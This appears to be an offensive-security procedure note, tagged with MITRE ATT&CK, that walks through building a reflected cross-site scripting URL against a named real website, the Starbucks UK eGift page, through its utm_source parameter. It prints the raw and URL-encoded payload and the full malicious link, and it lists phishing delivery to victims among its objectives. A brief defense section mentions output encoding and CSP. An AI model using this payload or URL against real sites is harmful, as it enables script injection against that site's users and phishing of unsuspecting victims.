---
id: proc-uuid-1
tags:
  - xss
  - payload-injection
  - url-encoding
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:33.629Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Construct-Malicious-URL-with-XSS-Payload-in-utm-source

## Summary

This procedure constructs a malicious URL by injecting a reflected XSS payload into the utm_source parameter of the Starbucks UK eGift page, exploiting insufficient input validation to close an existing HTML attribute and insert a script-executing event handler.

## Description

The Starbucks UK eGift page at https://www.starbucks.co.uk/shop/card/egift reflects the utm_source parameter directly into the HTML without proper escaping. By appending a payload that includes a closing quote, angle brackets, and an onbeforescriptexecute event handler, an attacker can inject arbitrary JavaScript. This step focuses on crafting the URL; execution occurs upon access. Prerequisites include basic knowledge of URL encoding and HTML injection techniques. Expected outcomes: a functional malicious link that can be shared to trick victims into visiting it.

## Requirements

1. Web browser or URL encoder tool for payload preparation
2. Knowledge of the target URL: https://www.starbucks.co.uk/shop/card/egift
3. Internet access to test the URL construction

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding for URL parameters (e.g., HTML entity encoding for < > " ')
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for unusual utm_source values in access logs

## Objectives

1. Create a URL that injects and reflects malicious HTML/JavaScript
2. Ensure payload survives URL transmission without breaking the page
3. Prepare for victim delivery via phishing or link sharing

## Instructions

### Step 1: Encode the XSS Payload

**Context**: The raw payload ">% <b onbeforescriptexecute=prompt(document.domain)> must be URL-encoded to bypass transmission filters and ensure proper injection.

Use a URL encoder to transform it into %3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e.

### Step 2: Append Payload to Target URL

**Context**: Combine the base URL with the utm_source parameter containing the encoded payload to form the malicious link.

Construct the full URL:

```url
https://www.starbucks.co.uk/shop/card/egift?utm_source=%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e
```

> This decodes on the server to ">% <b onbeforescriptexecute=prompt(document.domain)>, closing any open attribute (e.g., from a script src="...") and injecting the event handler.

**Expected Output**: A complete, accessible URL that loads the page without immediate errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[url-encoding]]
